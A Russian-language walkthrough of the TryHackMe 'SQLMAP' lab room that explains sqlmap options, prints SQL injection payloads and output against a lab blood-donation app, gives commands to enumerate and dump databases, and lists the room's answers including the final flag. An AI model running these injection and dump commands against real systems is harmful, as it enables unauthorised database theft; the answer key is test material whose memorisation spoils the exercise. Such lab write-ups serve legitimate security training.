[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [SQLMAP](https://tryhackme.com/r/room/sqlmap) 

Всего 3 задания:
## Задание 1
В этой комнате мы узнаем о sqlmap и о том, как его можно использовать для эксплуатации уязвимостей SQL- инъекций.

#### Что такое sqlmap? 

sqlmap — это инструмент для тестирования на проникновение с открытым исходным кодом, разработанный Бернардо Дамеле 
Ассумпсао Гимараешем и Мирославом Штампаром, который автоматизирует процесс обнаружения и эксплуатации уязвимостей 
SQL- инъекций и захвата серверов баз данных. Он поставляется с мощным механизмом обнаружения, множеством нишевых 
функций для лучшего тестировщика на проникновение и широким спектром переключателей, от снятия отпечатков с базы 
данных, извлечения данных из базы данных до доступа к базовой файловой системе и выполнения команд в операционной 
системе через внеполосные соединения.

Установка SQLmap
Если вы используете Kali Linux, sqlmap предустановлен. В противном случае вы можете скачать его здесь:  
https://github.com/sqlmapproject/sqlmap

### Ответьте на вопросы ниже
Прочитайте вышеизложенное и держите sqlmap наготове.
```commandline
Ответ не нужен
```

## Задание 2
#### Команды SQLmap
Чтобы отобразить базовое меню справки, просто введите в терминале. `sqlmap -h `

```commandline
nare@nare$ sqlmap -h
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    These options do not fit into any other category

    --wizard            Simple wizard interface for beginner users

[!] to see full list of options run with '-hh'
```

#### Основные  команды:
- -u URL, --url=URL -	Целевой URL (например, «http://www.site.com/vuln.php?id=1»)
- --data=ДАННЫЕ - Строка данных для отправки через POST (например, "id=1")
- --random-agent - Использовать случайно выбранное значение заголовка HTTP User-Agent
- -p TESTPARAMETER - Тестируемый(е) параметр(ы)
- --level=LEVEL - Уровень тестов для выполнения (1-5, по умолчанию 1)
- --risk=RISK - Риск проведения тестов (1-3, по умолчанию 1)
#### Команды перечисления :
Эти параметры можно использовать для перечисления информации, структуры и данных внутренней системы управления 
базами данных, содержащихся в таблицах. 
- -a, --all	Получить все
- -b, --banner	Получить баннер СУБД
- --current-user - Получить текущего пользователя СУБД
- --current-db - Извлечь текущую базу данных СУБД
- --passwords - Перечислить хэши паролей пользователей СУБД
- --dbs - Перечислить базы данных СУБД
- --tables - Перечисление таблиц базы данных СУБД
- --columns - Перечисление столбцов таблицы базы данных СУБД
- --schema - Перечисление схемы СУБД
- --dump - Дамп записей таблицы базы данных СУБД
- --dump-all - Дамп всех записей таблиц баз данных СУБД
- --is-dba - Определить, является ли текущий пользователь СУБД администратором баз данных
- -D <ИМЯ БД> - База данных СУБД для перечисления
- -T <ИМЯ ТАБЛИЦЫ> - Таблица(ы) базы данных СУБД для перечисления
- -C COL - Столбец(ы) таблицы базы данных СУБД для перечисления

#### Команды доступа к операционной системе 
Эти параметры можно использовать для доступа к внутренней системе управления базами данных в целевой операционной системе.
- --os-shell - Запрос на интерактивную оболочку операционной системы
- --os-pwn -	Запросить оболочку OOB, Meterpreter или VNC
- --os-cmd=OSCMD - Выполнить команду операционной системы
- --priv-esc - Повышение привилегий пользователя процесса базы данных
- --os-smbrelay - Запрос в один клик для оболочки OOB, Meterpreter или VNC

Обратите внимание, что таблицы, показанные выше, не являются всеми возможными переключателями для использования с 
sqlmap. Для более обширного списка опций запустите sqlmap -hh для отображения расширенного справочного сообщения.

Теперь, когда мы рассмотрели некоторые параметры, которые можно использовать с sqlmap, давайте перейдем к примерам, 
использующим запросы на основе методов GET и POST.


Простой тест на основе HTTP GET
```commandline
sqlmap -u https://testsite.com/page.php?id=7 --dbs
```


Здесь мы использовали два флага:  -u  для указания уязвимого URL и --dbs  для перечисления базы данных.


Простой тест на основе HTTP POST

Сначала нам нужно определить уязвимый запрос POST и сохранить его. Чтобы сохранить запрос, щелкните правой кнопкой 
мыши по запросу, выберите «Копировать в файл» и сохраните его в каталоге. Вы также можете скопировать весь запрос и 
сохранить его в текстовом файле.

Вы заметили, что в запросе выше есть параметр POST « blood_group », который может быть уязвимым параметром.

Сохранено HTTP POST-запрос
```commandline
nare@nare$ cat req.txt
POST /blood/nl-search.php HTTP/1.1
Host: 10.10.17.116
Content-Length: 16
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.17.116
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.17.116/blood/nl-search.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=bt0q6qk024tmac6m4jkbh8l1h4
Connection: close

blood_group=B%2B
```


Теперь, когда мы определили потенциально уязвимый параметр, давайте перейдем к sqlmap и используем следующую команду:
```commandline
sqlmap -r req.txt -p blood_group --dbs

sqlmap -r <request_file> -p <vulnerable_parameter> --dbs
```



Здесь мы использовали два флага:  -r для чтения файла,  -p  для указания уязвимого параметра и  --dbs  для перечисления базы данных.

Перечисление базы данных
```commandline
nare@nare$ sqlmap -r req.txt -p blood_group --dbs
[19:31:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:31:50] [INFO] POST parameter 'blood_group' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[19:33:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:33:09] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:33:09] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[19:33:09] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')
[19:33:10] [WARNING] reflective value(s) found and filtering out
[19:33:12] [INFO] target URL appears to be UNION injectable with 8 columns
[19:33:13] [INFO] POST parameter 'blood_group' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'blood_group' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:
---
Parameter: blood_group (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blood_group=B+' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND 'gXEj'='gXEj

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: blood_group=B+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x58784e494a4c43546361475a45546c676e736178584f517a457070784c616b4849414c69594c6371,0x71716a7a71)-- -
---
[19:33:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0.12
[19:33:17] [INFO] fetching database names
available databases [6]:
[*] blood
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] test
```

Теперь, когда у нас есть базы данных, давайте извлечем таблицы из базы данных blood .
Использование метода на основе GET
```commandline
sqlmap -u https://testsite.com/page.php?id=7 -D blood --tables

sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables
```


Использование метода на основе POST
```commandline
sqlmap -r req.txt -p blood_group -D blood --tables

sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables
```


После выполнения этих команд мы должны получить таблицы.

Получение таблиц
```commandline
nare@nare$ sqlmap -r req.txt -p blood_group -D blood --tables
[19:35:57] [INFO] parsing HTTP request from 'req.txt'
[19:35:57] [INFO] resuming back-end DBMS 'mysql'
[19:35:57] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blood_group (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blood_group=B+' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND 'gXEj'='gXEj

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: blood_group=B+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x58784e494a4c43546361475a45546c676e736178584f517a457070784c616b4849414c69594c6371,0x71716a7a71)-- -
---
[19:35:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0.12
[19:35:58] [INFO] fetching tables for database: 'blood'
[19:35:58] [WARNING] reflective value(s) found and filtering out
Database: blood
[3 tables]
+----------+
| blood_db |
| flag     |
| users    |
+----------+
```


Теперь, когда у нас есть доступные таблицы, давайте соберем столбцы из таблицы  blood_db .

Используя метод на основе GET
```commandline
sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns

sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns
```

Использование метода на основе POST
```commandline
sqlmap -r req.txt -D blood -T blood_db --columns

sqlmap -r req.txt -D <database_name> -T <table_name> --columns
```

Получение таблиц
```commandline
nare@nare$ sqlmap -r req.txt -D blood -T blood_db --columns
[19:35:57] [INFO] parsing HTTP request from 'req.txt'
[19:35:57] [INFO] resuming back-end DBMS 'mysql'
[19:35:57] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blood_group (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blood_group=B+' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND 'gXEj'='gXEj

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: blood_group=B+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x58784e494a4c43546361475a45546c676e736178584f517a457070784c616b4849414c69594c6371,0x71716a7a71)-- -
---
[19:35:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0.12
[19:35:58] [INFO] fetching tables for database: 'blood'
[19:35:58] [WARNING] reflective value(s) found and filtering out
Database: blood
[3 tables]
+----------+
| blood_db |
| flag     |
| users    |
+----------+
```

Или мы можем просто выгрузить все доступные базы данных и таблицы, используя следующие команды.


Использование метода на основе GET
```commandline
sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --dump-all

sqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all
```
Использование метода на основе POST
```commandline
sqlmap -r req.txt -D <database_name> --dump-all

sqlmap -r req.txt-p  -D <database_name> --dump-all
```
Надеюсь, вам понравилось знакомство с основами использования sqlmap и его различными командами. Теперь давайте 
приступим к следующему заданию! 

### Ответьте на вопросы ниже
Какой флаг или опция позволит вам добавить URL-адрес к команде?
```commandline
-u
```
Какой флаг вы бы использовали для добавления данных в POST-запрос?
```commandline
--data
```
Есть два параметра: имя пользователя и пароль. Как бы вы сказали sqlmap использовать параметр имени пользователя для атаки?
```commandline
-p username
```
Какой флаг вы бы использовали для отображения расширенного меню справки?
```commandline
-hh
```
Какой флаг позволяет вам извлечь все?
```commandline
-a
```
Какой флаг позволяет выбрать имя базы данных?
```commandline
-D
```
Какой флаг вы бы использовали для извлечения таблиц базы данных?
```commandline
--tables
```
Какой флаг позволяет извлечь столбцы таблицы?
```commandline
--columns
```
Какой флаг позволяет вывести все записи таблицы базы данных?
```commandline
--dump-all
```
Какой флаг выдаст вам интерактивное приглашение SQL Shell?
```commandline
--sql-shell
```
Вы знаете, что текущий тип базы данных — 'MYSQL'. Какой флаг позволяет перечислять только базы данных MySQL?
```commandline
--dbms=mysql
```

## Задание 3
Разверните машину, подключенную к этой задаче, затем перейдите к  (загрузка этой машины может занять до 3 минут)
MACHINE_IP 

Задача: 
Мы развернули приложение для сбора «Донорства крови». Запрос, похоже, уязвим.
Воспользуйтесь уязвимостью SQL- инъекции в уязвимом приложении, чтобы найти флаг.

### Ответьте на вопросы ниже
Как называется интересный каталог?
```commandline
blood
```
Кто является текущим пользователем базы данных? 
```commandline
root
```
Какой последний флаг? 
```commandline
thm{sqlm@p_is_L0ve}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)